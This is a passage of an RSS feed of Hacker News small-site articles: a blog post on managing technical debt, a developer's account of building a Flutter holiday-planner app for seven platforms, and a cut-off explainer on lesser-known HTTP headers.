<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://labcodes.com.br/blog/articles/tech-debt.html">https://labcodes.com.br/blog/articles/tech-debt.html</a></em></p>]]>
            </description>
            <link>https://labcodes.com.br/blog/articles/tech-debt.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871348</guid>
            <pubDate>Fri, 23 Oct 2020 16:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built 6 (+1) apps in one day]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24871322">thread link</a>) | @danesz
<br/>
October 23, 2020 | https://danieldallos.com/posts/2020/07/how-i-built-6-1-apps-in-one-day/ | <a href="https://web.archive.org/web/*/https://danieldallos.com/posts/2020/07/how-i-built-6-1-apps-in-one-day/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>“One day, 7 apps, of course… How long was that day? 168 hours? Define ‘one day’!"</em><br>
Are you looking for the <a href="#definition-of-one-day">definition</a>?</p>
<h2 id="the-story">The Story</h2>
<p>Usually, every product story starts with a pain, a problem that needs to be solved. A problem that bothers you, annoys you, you face it frequently and probably you are not alone with it.<br>
This case was not different either.</p>
<p>A few months ago we started to use a new HR system that has a lot of advantages compared to the old one. But it had disadvantages too… Missing functionality, missing information… or the information is there, but hard to get it out from the system.</p>
<p>That’s when the idea of <a href="https://pandoo.tweaked.tech/">Pandoo</a> (the holiday planner) was born.</p>
<figure>
<a href="https://pandoo.tweaked.tech/">
<img src="https://danieldallos.com/images/flutter-pandoo/pandoo_icon_original.png" alt="Pandoo Icon">
</a>
</figure>
<h2 id="the-problem">The Problem</h2>
<p>The new tool did lack some features that we got used to.</p>
<p>A nice(r) and clean(er) way to see all of your holidays, your team’s holidays (and type of those holidays), and book them in a bunch.</p>
<p><strong>Disclaimer:</strong> <em>Maybe some of these problems are manageable with admin configurations or with educating the users.. but usually, when people switch tools they just expect that “it works” and they have all the things they had previously plus nice extras.</em></p>
<p><em>The goal of this article is not to blame the tool, it is about the solution and the key learnings.</em></p>
<h2 id="the-solution">The Solution</h2>
<p>I wanted to bring back the functionalities from the old tool. I wanted to see my holidays as I was used to, I wanted to book my holidays as I used to. And I was not alone with this.</p>
<h3 id="the-requirements">The Requirements</h3>
<ul>
<li>I don’t want to waste too much time on the MVP, just get it to work with the basic functionality and make me happy.</li>
<li>There is no way that I will build multiple apps using multiple programming languages.</li>
<li>Mobile-first, but bigger screen support would be nice where I can see more data.</li>
<li>Challenge myself.</li>
</ul>
<h3 id="the-choice">The Choice</h3>
<h4 id="flutter">Flutter</h4>
<figure>
<img src="https://danieldallos.com/images/flutter-pandoo/flutter.png" alt="Flutter logo">
</figure>
<p>Why?</p>
<ul>
<li>Flutter’s promise</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a> is a cross-platform tool made by Google, that helps you <strong>build native mobile apps from a single codebase</strong>.<br>
<em>(Edit (19/09/2020): This has been changed a bit as you will see it later. )</em></p>
<ul>
<li>I had some experiences already.</li>
</ul>
<p>I have built <a href="http://edengreen.tweaked.tech/">Edengreen</a>, a tool that helps you check your available meal vouchers.<br>
It is a really basic app, but it taught me the basics of how Flutter works. At this time Flutter was still in beta.</p>
<p>One of my other projects was <a href="https://coronavirusalert.tweaked.tech/">CoronaVirus Alert</a>, a tool that monitors the infections country by country and sends you push notifications.<br>
In this project, I have played with Firebase, serverless functions, and custom scripts here and there. I have learned that there is a <strong>big pool of third-party libraries</strong> for Flutter and <strong>the community is growing rapidly</strong> too.</p>
<ul>
<li>Web support</li>
</ul>
<p>I have never tried, but apparently, there was rudimentary Web support too.</p>
<ul>
<li>The challenge</li>
</ul>
<p>My previous projects helped me to understand the basics but I wanted to achieve more and the Web support was sounded interesting too.</p>
<h3 id="know-your-stuff">Know Your Stuff</h3>
<p>I needed a giant scrollable table view where horizontally I can show the days of the year and vertically all of my colleagues and their holidays.<br>
This sounds easy, but in reality, it never is. Weird, annoying edge-cases when you are almost done, lack of Flutter knowledge from my side, unforeseen platform limitations, etc…</p>
<p>I wanted to see what is available already by the community, maybe there is something that is similar and it can fit my needs (with minimal tweaking). Luckily I have found the <a href="https://pub.dev/packages/horizontal_data_table">horizontal_data_table</a> package, that provided 90% of what I have needed… I have forked the package and did some fine-tuning for my needs on the way.</p>
<p>Getting the data from the HR tool was pretty easy, they provide a nice REST API to interact with the back-end.</p>
<p>When you connect the dots you have to be cautious. You need to know what you expect from your tool, how it is going to work. How does it get the data? Do we need to store the data locally? Do we need an extra server-side logic too? Do we plan to use any exotic UI elements?</p>
<p>These are important questions, because when you pick a library/package in Flutter and e.g. if it works on Android it does not mean automatically that it works on iOS too… or even on the Web. You need to pick libraries that rely on the default native support and no additional native third-party libraries. (Or the reliance on those libraries needs to be complete on every side.)</p>
<p>For example, if you would like to use Firebase services in your app, you need to check which platforms <a href="https://github.com/FirebaseExtended/flutterfire">are supported</a>. <strong>If your target is not, probably you will face a runtime crash when Flutter tries to access the non-existent APIs.</strong></p>
<p>When you search for a Flutter package in the official <a href="https://pub.dev/">Dart/Flutter package repository</a>, you can also see which platforms are supported.</p>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/package_platform_support.png">
<img src="https://danieldallos.com/images/flutter-pandoo/package_platform_support.png" alt="Package Platform support">
</a>
</figure>
<h3 id="3-apps-at-once">3 Apps at Once</h3>
<p>Based on past experiences in the MVP I did not choose any special external library (except the horizontal_data_table) because I wanted to limit the compatibility issues between iOS, Android, and Web.</p>
<p>After I was done with the minimal version, I tested the implementation on Android and iOS.<br>
It worked and looked nice! (Sure, it had some performance issues here and there while scrolling through the holidays of the whole company… but on a limited dataset it was good.)</p>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/android.png">
<img src="https://danieldallos.com/images/flutter-pandoo/android.png" alt="Android support">
</a>
<figcaption>
<p>
Pandoo on Android
</p>
</figcaption>
</figure>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/ios.png">
<img src="https://danieldallos.com/images/flutter-pandoo/ios.png" alt="iOS support">
</a>
<figcaption>
<p>
Pandoo on iOS
</p>
</figcaption>
</figure>
<p>So now we have <strong>two apps</strong> ready to use!</p>
<p>Let’s see how it works on the Web.<br>
Of course, it crashed in a few places 😀.
But nothing serious that a good old “if-else” could not solve. I have still used some APIs that were not available on the Web, so I needed to use <code>kIsWeb</code> <a href="https://api.flutter.dev/flutter/foundation/kIsWeb-constant.html">constant</a> to differ the logic between Web and native mobile.</p>
<p>It also had some UI quirks due to unsupported/buggy UI elements (<a href="https://github.com/flutter/flutter/issues/45505">with gradients</a>), but it was good enough for the current phase.</p>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/web_table.png">
<img src="https://danieldallos.com/images/flutter-pandoo/web_table.png" alt="Web support - table view">
</a>
<figcaption>
<p>
Pandoo on Web with rendering issues (grey boxes, weird dividers)
</p>
</figcaption>
</figure>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/web_balance.png">
<img src="https://danieldallos.com/images/flutter-pandoo/web_balance.png" alt="Web support - balance view">
</a>
<figcaption>
<p>
Pandoo on Web showing the Holiday Balance
</p>
</figcaption>
</figure>
<p>We have the <strong>third app</strong> too, and you could say <em>“Ok, you are done, you have it all, Web runs on all platforms”</em>.</p>
<p>But wait, there is more!</p>
<h3 id="the-meetup-and-the-extra-3-apps">The Meetup and The Extra 3 Apps</h3>
<p>I really like Meetups. I can meet with like-minded people, listen to good and interesting presentations, and sometimes <a href="https://www.meetup.com/gdg-brussels/photos/27573830/457831934/">I give a talk too</a> 😊.</p>
<p>There was a promising Meetup from <a href="https://www.meetup.com/gdg-brussels/events/268503398/">GDG Brussels on Flutter topic</a>. Based on the presentation summary, it intended to be a basic Flutter intro and the experiences of the author.<br>
So it could be nothing interesting for me, I am kinda done with the basics… but I always like to repeat similar things, because maybe I can discover a new bit of information that can change my perspective and start me thinking.
For the same reason, I read/listen to books on similar topics too… even the 95% is the same as a previous book, the remaining 5% is worth the time.</p>
<p><strong>Luckily this case was not different either.</strong><br>
The presenter walked through their app development challenges and how quickly they have re-implemented the apps from scratch in Flutter.</p>
<p>Then he showed something interesting. His app was in a weird-looking window. It looked like a browser or a bezel-less iOS simulator. Apparently, it was his application compiled into a <strong>native MacOS app</strong>. It turned out that Flutter added support for <a href="https://flutter.dev/desktop">Desktop</a> platforms. Obviously, this was even in an earlier stage than the Web support, but it is worth a try.</p>
<p>The next day I tried it, it worked! I had Pandoo as a native MacOS app. Meanwhile, I have discovered that there is also really basic support for Linux and Windows… After the initial setup of the environments in VirtualBox, I could compile Pandoo as a <strong>native Windows and Linux app</strong> too! 🎉</p>
<p>Sure, there were some extra limitations on Windows and Linux, I had to do some extra “if-else” conditions. E.g. there was no persistent storage API available on these platforms, so I could not save any data to the disk.<br>
<em>(Edit (19/09/2020): Later I did polyfill these missing features by using the default Dart file reading and writing APIs.)</em></p>
<p>Extra <strong>three apps are done</strong>. Sounds good, doesn’t it?</p>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/ubuntu.png">
<img src="https://danieldallos.com/images/flutter-pandoo/ubuntu.png" alt="Ubuntu support">
</a>
<figcaption>
<p>
Pandoo on Ubuntu
</p>
</figcaption>
</figure>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/windows.png">
<img src="https://danieldallos.com/images/flutter-pandoo/windows.png" alt="Windows support">
</a>
<figcaption>
<p>
Pandoo on Windows
</p>
</figcaption>
</figure>
<figure>
<a href="https://danieldallos.com/images/flutter-pandoo/macos.png">
<img src="https://danieldallos.com/images/flutter-pandoo/macos.png" alt="MacOS support">
</a>
<figcaption>
<p>
Pandoo on MacOS showing the Holiday Balance
</p>
</figcaption>
</figure>
<h3 id="1">+1</h3>
<p>We can argue on this if it counts as the seventh app or not. But it was such a nice surprise to me, so please allow me to count it as +1.</p>
<p>While I was testing Pandoo in the Chrome Browser on my phone, I got a popup that asked me if I would like to add Pandoo to my home screen. Sure, why not. But this icon on my home screen looked different from another page link. And… it also appeared between my apps in the Launcher. What?</p>
<p>It turned out that the <strong>Web apps built by Flutter are PWA applications</strong> too. So even if the device is offline, you can open and use the web apps.
Or, you could… if a webpage is made for that. In my case I don’t cache any data from the HR tool, I fetch all the data from the API every time.
That means when Pandoo is loaded inside the browser and you try to use it without an Internet connection, it shows an API error (just like all the other versions of the app). I could save the last fetched data locally and load it immediately at app start (while the new is loading)… but for now, it is ok as it is.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think Flutter is a strong candidate in the app development era. Not only for mobile but in general.</p>
<p>I did not write a single line of code to have a Mac OSX app. Although I have some experiences with Mac OSX apps (<a href="https://mike.tweaked.tech/">Mike</a>) so I would have an idea where to start, it is not a copy/paste from an iOS app, you need to put some work there. Hopefully <a href="https://developer.apple.com/mac-catalyst/">Mac Catalyst</a> will help with this in the future.</p>
<p>Write an app for Windows and Linux? I would not even think about it.</p>
<p>The additional Web support is really nice, and it can be really useful. For example, if you have a Revolut and TransferWise account you probably noticed that the mobile apps are very similar to each other, and they also provide a Web version too with a limited feature set. I don’t know what technologies they use, but (if not Flutter already) I can imagine in the future these kinds of services will consider Flutter for their apps.</p>
<h3 id="definition-of-one-day">Definition of ‘One Day’</h3>
<p>Probably at this point, you think <em>“How on Earth was this possible in one day”</em>?</p>
<p>My definition of one day: <strong>14-16 hours</strong>.</p>
<p>In this …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danieldallos.com/posts/2020/07/how-i-built-6-1-apps-in-one-day/">https://danieldallos.com/posts/2020/07/how-i-built-6-1-apps-in-one-day/</a></em></p>]]>
            </description>
            <link>https://danieldallos.com/posts/2020/07/how-i-built-6-1-apps-in-one-day/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871322</guid>
            <pubDate>Fri, 23 Oct 2020 16:41:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The power of HTTPS headers and 4 examples you did not know before]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24871129">thread link</a>) | @loweisz
<br/>
October 23, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
